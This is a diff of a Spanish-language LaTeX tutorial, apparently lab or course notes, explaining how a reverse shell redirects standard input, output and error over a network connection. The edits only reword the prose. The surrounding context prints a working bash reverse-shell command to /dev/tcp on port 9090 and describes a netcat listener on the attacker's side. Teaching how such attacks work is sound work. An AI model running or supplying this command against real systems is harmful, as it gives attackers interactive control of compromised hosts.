@@ -4,7 +4,7 @@
 
 La idea principal de una shell reversa es poder redirigir los dispositivos de standard input, output y error hacia una conexión de red, pudiendo así enviar y recibir información a través de este canal por la shell. En la otra punta de la conexión estará la máquina del atacante corriendo un programa mostrando lo que venga de la shell del otro lado de la conexión, al mismo tiempo este programa enviará lo que el atacante escriba usando la misma conexión de red.
 
-Uno de los programas más usados por los atacantes para este propósito es \texttt{netcat}, si se corre con el parámetro \texttt{"-l"}, este se pondrá a la escucha de un puerto TCP en un puerto específico, convirtiéndose en un servidor TCP. Este servidor bastante simple hecho con netcat, imprimirá lo que llegue lo que se envie por un cliente y enviará lo que el usuario corriendo el servidor escriba.
+Uno de los programas más usados por los atacantes para este propósito es \texttt{netcat}, si se corre con el parámetro \texttt{"-l"}, este se pondrá a la escucha de un puerto TCP en un puerto específico, convirtiéndose en un servidor TCP. Este servidor bastante simple hecho con netcat, mostrará lo que sea enviado por parte de un cliente y enviará lo que el usuario corriendo el servidor escriba.
 En el siguiente experimento usaremos  \texttt{netcat} para ponernos a la escucha en el puerto TCP \texttt{9090} simulando ser un servidor TCP.
 
 \begin{lstlisting}
@@ -28,7 +28,7 @@ Server(10.0.2.5):$ /bin/bash -i > /dev/tcp/10.0.2.6/9090 0<&1 2>&1
 \end{lstlisting}
 
 Este comando normalmente es ejecutado por un atacante en un servidor comprometido.
-Es un tanto engorroso, en los siguientes parráfos darémos una explicación detallada de su funcionamiento. 
+Debido a que esta línea es un tanto engorrosa, en los siguientes parráfos darémos una explicación detallada de su funcionamiento. 
 
 
 \begin{itemize}
